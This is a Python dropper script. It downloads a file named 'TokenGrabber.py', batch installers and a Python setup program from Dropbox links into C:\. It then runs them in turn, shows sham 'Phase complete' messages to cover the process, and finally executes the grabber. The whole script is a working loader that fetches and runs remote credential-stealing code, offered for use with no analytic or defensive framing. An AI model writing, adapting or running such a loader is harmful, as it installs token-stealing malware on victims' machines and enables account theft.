import urllib.request
import os
import time

print("Downloading files using urllib...")

url1 = 'https://www.dropbox.com/s/1bqrnvz3xhlubtr/TokenGrabber.py?dl=1'
urllib.request.urlretrieve(url1, r'C:\grabber.py')

print("Main script downloaded...")

url2 = 'https://www.dropbox.com/s/facr5cg8ybw0rhf/RequirementInstaller.bat?dl=1'
urllib.request.urlretrieve(url2, r'C:\dependencyInstaller.bat')

print("Dependency installer downloaded...")

url2 = 'https://www.dropbox.com/s/pnyhu46z5bk45i6/PythonInstaller.bat?dl=1'
urllib.request.urlretrieve(url2, r'C:\pythonInstaller.bat')

print("Python installation automator downloaded...")

url4 = 'https://www.dropbox.com/s/p5c7ldofsm5lb5o/python-3.9.0.exe?dl=1'
urllib.request.urlretrieve(url4, r'C:\python-3.9.0.exe')

print("Python setup downloaded.. Running installers...")

time.sleep(3)
os.system('C:\pythonInstaller.bat')
print("Python installer ran...")
time.sleep(4)
print("Phase 1 Complete")
time.sleep(4)
print("Phase 2 Complete")
time.sleep(4)
print("Phase 3 Complete")
time.sleep(4)
print("Phase 4 Complete")
time.sleep(4)
print("All phases complete, running requirements installer...")
os.system('C:\dependencyInstaller')
time.sleep(5)
os.system('C:\dependencyInstaller')
time.sleep(3)
os.system('C:\grabber.py')
input("Main script ran")
